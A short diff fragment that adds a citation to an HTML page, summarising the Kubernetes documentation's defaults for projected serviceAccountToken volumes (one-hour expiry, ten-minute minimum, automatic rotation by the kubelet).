+<p>[R25] <a href="https://kubernetes.io/docs/concepts/storage/projected-volumes/">Projected Volumes | Kubernetes</a> — documents <code>serviceAccountToken</code> projected volume defaults: <code>expirationSeconds</code> defaults to 3600 (1 hour), minimum 600 (10 minutes); kubelet rotates the token automatically before expiry</p>
+  <p class="back-top"><a href="#top">↑ Back to top</a></p>
+</body>
+</html>
